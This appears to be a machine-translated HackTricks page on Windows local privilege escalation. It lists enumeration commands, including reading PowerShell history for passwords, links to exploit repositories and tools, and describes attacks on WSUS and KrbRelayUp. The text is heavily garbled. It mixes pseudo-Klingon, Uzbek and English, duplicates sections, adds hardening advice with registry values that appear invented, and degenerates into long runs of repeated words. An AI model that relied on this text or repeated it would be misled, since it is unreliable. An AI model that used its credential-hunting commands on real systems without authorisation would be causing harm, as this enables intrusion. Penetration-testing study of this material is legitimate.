# Windows Local Privilege Escalation

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### **Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Initial Windows Theory

### Access Tokens

**If you don't know what are Windows Access Tokens, read the following page before continuing:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACLs - DACLs/SACLs/ACEs

**Check the following page for more info about ACLs - DACLs/SACLs/ACEs:**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### Integrity Levels

**If you don't know what are integrity levels in Windows you should read the following page before continuing:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Windows Security Controls

There are different things in Windows that could **prevent you from enumerating the system**, run executables or even **detect your activities**. You should **read** the following **page** and **enumerate** all these **defenses** **mechanisms** before starting the privilege escalation enumeration:

{% content-ref url="../authentication-credentials-uac-and-efs.md" %}
[authentication-credentials-uac-and-efs.md](../authentication-credentials-uac-and-efs.md)
{% endcontent-ref %}

## System Info

### Version info enumeration

Check if the Windows version has any known vulnerability (check also the patches applied).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

[Site](https://msrc.microsoft.com/update-guide/vulnerability) vItlh Microsoft security vulnerabilities vItlh detailed information vItlh search. 4,700 security vulnerabilities vItlh database, Windows environment **massive attack surface** vItlh.

**System vItlh**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas watson embedded)_

**Locally vItlh system information**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos vItlh exploits:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Any credential/Juicy info saved vItlh env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```
### PowerShell History

#### tlhIngan Hol

#### tlhIngan Hol

PowerShell logs the commands executed by users in a history file. This file is located at `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`. By default, PowerShell keeps the last 4096 commands in the history file.

To view the command history, you can use the `Get-History` cmdlet. This will display a list of executed commands along with their corresponding IDs.

To execute a command from the history, you can use the `Invoke-History` cmdlet followed by the command ID. For example, `Invoke-History -Id 123` will execute the command with ID 123.

To clear the command history, you can use the `Clear-History` cmdlet. This will remove all the commands from the history file.

#### tlhIngan Hol

PowerShell logs the commands executed by users in a history file. This file is located at `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`. By default, PowerShell keeps the last 4096 commands in the history file.

To view the command history, you can use the `Get-History` cmdlet. This will display a list of executed commands along with their corresponding IDs.

To execute a command from the history, you can use the `Invoke-History` cmdlet followed by the command ID. For example, `Invoke-History -Id 123` will execute the command with ID 123.

To clear the command history, you can use the `Clear-History` cmdlet. This will remove all the commands from the history file.
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript files

You can learn how to turn this on in [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Details of PowerShell pipeline executions are recorded, encompassing executed commands, command invocations, and parts of scripts. However, complete execution details and output results might not be captured.

To enable this, follow the instructions in the "Transcript files" section of the documentation, opting for **"Module Logging"** instead of **"Powershell Transcription"**.

### PowerShell Module Logging

PowerShell pipeline executions details are recorded, including executed commands, command invocations, and parts of scripts. However, complete execution details and output results might not be captured.

To enable this, follow the instructions in the "Transcript files" section of the documentation, opting for **"Module Logging"** instead of **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
To view the last 15 events from Powershell logs you can execute:

```
Get-WinEvent -LogName PowerShell | Select-Object -Last 15
```

This command retrieves the latest 15 events from the PowerShell log.
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

**PowerShell** **Script Block Logging**:

**Script Block Logging** captures a complete activity and full content record of the script's execution. This ensures that every block of code is documented as it runs. This process is valuable for forensics and analyzing malicious behavior, as it preserves a comprehensive audit trail of each activity. By documenting all activity at the time of execution, detailed insights into the process are provided.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
**Application and Services Logs > Microsoft > Windows > PowerShell > Operational** jImejDaq logmey.\
20 logmey DajatlhlaHbe'.
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet Settings

#### Overview

Internet settings play a crucial role in the security and performance of a Windows system. By properly configuring these settings, you can enhance the overall security posture and protect against various attacks. This section provides an overview of important internet settings that should be considered for hardening a Windows system.

#### Disable AutoProxy

AutoProxy is a feature that automatically detects and configures proxy settings for internet connections. However, this feature can be abused by attackers to redirect traffic and perform man-in-the-middle attacks. To mitigate this risk, it is recommended to disable AutoProxy.

##### Windows Registry

To disable AutoProxy using the Windows Registry, follow these steps:

1. Open the Registry Editor by pressing `Win + R` and typing `regedit`.
2. Navigate to the following path: `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings`.
3. Create a new DWORD value named `AutoProxyEnable` and set its value to `0`.
4. Restart the system for the changes to take effect.

##### Group Policy

To disable AutoProxy using Group Policy, follow these steps:

1. Open the Group Policy Editor by pressing `Win + R` and typing `gpedit.msc`.
2. Navigate to `User Configuration -> Administrative Templates -> Windows Components -> Internet Explorer`.
3. Double-click on the `Disable caching of Auto-Proxy scripts` policy and set it to `Enabled`.
4. Double-click on the `Disable changing Automatic Configuration settings` policy and set it to `Enabled`.
5. Apply the changes and restart the system for the changes to take effect.

#### Disable WPAD

Web Proxy Auto-Discovery (WPAD) is a protocol that allows automatic discovery of proxy settings on a network. However, this protocol can be exploited by attackers to redirect traffic and perform man-in-the-middle attacks. To mitigate this risk, it is recommended to disable WPAD.

##### Windows Registry

To disable WPAD using the Windows Registry, follow these steps:

1. Open the Registry Editor by pressing `Win + R` and typing `regedit`.
2. Navigate to the following path: `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Wpad`.
3. Create a new DWORD value named `WpadOverride` and set its value to `1`.
4. Restart the system for the changes to take effect.

##### Group Policy

To disable WPAD using Group Policy, follow these steps:

1. Open the Group Policy Editor by pressing `Win + R` and typing `gpedit.msc`.
2. Navigate to `User Configuration -> Administrative Templates -> Windows Components -> Internet Explorer`.
3. Double-click on the `Disable Autodiscovery of Proxy` policy and set it to `Enabled`.
4. Apply the changes and restart the system for the changes to take effect.

#### Disable Proxy Auto-Config (PAC)

Proxy Auto-Config (PAC) is a file that contains JavaScript functions used to determine proxy settings for internet connections. However, this file can be manipulated by attackers to redirect traffic and perform man-in-the-middle attacks. To mitigate this risk, it is recommended to disable PAC.

##### Windows Registry

To disable PAC using the Windows Registry, follow these steps:

1. Open the Registry Editor by pressing `Win + R` and typing `regedit`.
2. Navigate to the following path: `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings`.
3. Create a new DWORD value named `EnableAutoProxyResultCache` and set its value to `0`.
4. Restart the system for the changes to take effect.

##### Group Policy

To disable PAC using Group Policy, follow these steps:

1. Open the Group Policy Editor by pressing `Win + R` and typing `gpedit.msc`.
2. Navigate to `User Configuration -> Administrative Templates -> Windows Components -> Internet Explorer`.
3. Double-click on the `Disable caching of Auto-Proxy scripts` policy and set it to `Enabled`.
4. Double-click on the `Disable changing Automatic Configuration settings` policy and set it to `Enabled`.
5. Apply the changes and restart the system for the changes to take effect.

#### Conclusion

Properly configuring internet settings is essential for hardening a Windows system. By disabling AutoProxy, WPAD, and PAC, you can mitigate the risk of traffic redirection and man-in-the-middle attacks. It is recommended to apply these settings to enhance the security posture of your Windows environment.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Qa'Hom

#### `wmic logicaldisk get caption,description,providername,volumename`

This command displays information about the logical drives on the system, including the drive letter, description, provider name, and volume name.

#### `wmic logicaldisk where drivetype=3 get caption,description,providername,volumename`

This command displays information about the fixed drives on the system, including the drive letter, description, provider name, and volume name.

#### `wmic logicaldisk where drivetype=4 get caption,description,providername,volumename`

This command displays information about the network drives on the system, including the drive letter, description, provider name, and volume name.

#### `wmic logicaldisk where drivetype=5 get caption,description,providername,volumename`

This command displays information about the CD-ROM drives on the system, including the drive letter, description, provider name, and volume name.

#### `wmic logicaldisk where drivetype=6 get caption,description,providername,volumename`

This command displays information about the RAM disk drives on the system, including the drive letter, description, provider name, and volume name.

#### `wmic logicaldisk where drivetype=7 get caption,description,providername,volumename`

This command displays information about the other drives on the system, including the drive letter, description, provider name, and volume name.

#### `wmic logicaldisk where drivetype=8 get caption,description,providername,volumename`

This command displays information about the RAM disk drives on the system, including the drive letter, description, provider name, and volume name.

#### `wmic logicaldisk where drivetype=9 get caption,description,providername,volumename`

This command displays information about the other drives on the system, including the drive letter, description, provider name, and volume name.

#### `wmic logicaldisk where drivetype=10 get caption,description,providername,volumename`

This command displays information about the other drives on the system, including the drive letter, description, provider name, and volume name.

#### `wmic logicaldisk where drivetype=11 get caption,description,providername,volumename`

This command displays information about the other drives on the system, including the drive letter, description, provider name, and volume name.
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

jIyajbe'chugh, 'ej HTTPDaq HTTP**S**Daq lo'laHbe'lu'chugh, 'ej 'ejDI' 'e' vItlhutlh.

vItlhutlhpu' 'e' vItlhutlhpu' 'e' HTTPDaq HTTPDaq lo'laHbe'lu'chugh, 'ej vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlhpu' 'e' vItlhutlh
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
**ghotvam'e'** (If you get a reply such as:)
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` **1** **bo'layotgan** bo'lsa, **bu foydalanish mumkin.** Agar oxirgi registri 0 ga teng bo'lsa, WSUS kiritmasi e'tiborsiz qoldiriladi.

Ushbu xavfsizlik nusxasidan foydalanish uchun, [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS](https://github.com/GoSecure/pywsus) kabi vositalardan foydalanishingiz mumkin - Bu MiTM vositalaridir, ular non-SSL WSUS trafikiga "yolg'on" yangilanishlar kiritish uchun ishlatiladigan ekspluatatsiya skriptlardir.

Ushbu tadqiqotni shu yerda o'qing:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**To'liq hisobotni shu yerda o'qing**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Asosan, bu xato qandaydir:

> Agar biz o'zimizning mahalliy foydalanuvchi proksisini o'zgartirishga ega bo'lsak va Windows yangilanishlari Internet Explorer sozlamalarida sozlangan proksini ishlatadigan bo'lsa, shunda biz o'z trafikimizni o'zimizni qo'llab-quvvatlash uchun [PyWSUS](https://github.com/GoSecure/pywsus) ni mahalliy ravishda ishga tushirish va kodni oshirish imkoniyatiga ega bo'lamiz.
>
> Qo'shimcha ravishda, WSUS xizmati joriy foydalanuvchi sozlamalaridan foydalanadi, shuningdek, uning sertifikatlar saqlanadi. Agar biz WSUS uchun o'zimizning host nomiga o'zimizning sertifikatini yaratib, ushbu sertifikatni joriy foydalanuvchi sertifikatlar saqlash joyiga qo'shsak, HTTP va HTTPS WSUS trafikini ham o'zimizni qo'llab-quvvatlash imkoniyatiga ega bo'lamiz. WSUS sertifikatga ishonch hosil qilish uchun trust-on-first-use turi tekshirish mekanizmlaridan foydalanmaydi. Agar foydalanuvchi tomonidan ishonch bilan qabul qilingan va to'g'ri host nomiga ega bo'lgan sertifikat taklif qilingan bo'lsa, ushbu xizmat uni qabul qiladi.

Ushbu nusxadan foydalanish uchun [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) vositasidan foydalanishingiz mumkin (uni ozod qilgandan so'ng).

## KrbRelayUp

Windows **domen** muhitida ma'lum sharoitlarda **mahalliy privilege oshirish** nusxasi mavjud. Ushbu sharoitlar LDAP imzolashni **majburiy qilmagan** muhitlarda, foydalanuvchilar **Resursga asoslangan cheklovli delegatsiyani (RBCD)** sozlash huquqiga ega bo'lgan va foydalanuvchilarining domen ichida kompyuterlar yaratish imkoniyatiga ega bo'lgan muhitlarda ro'y beradi. Muhim e'tibor beringki, ushbu **talablar** **default sozlamalar** bilan bajariladi.

Ekspluatatsiyani [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) manzilida topishingiz mumkin

Hamda hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning 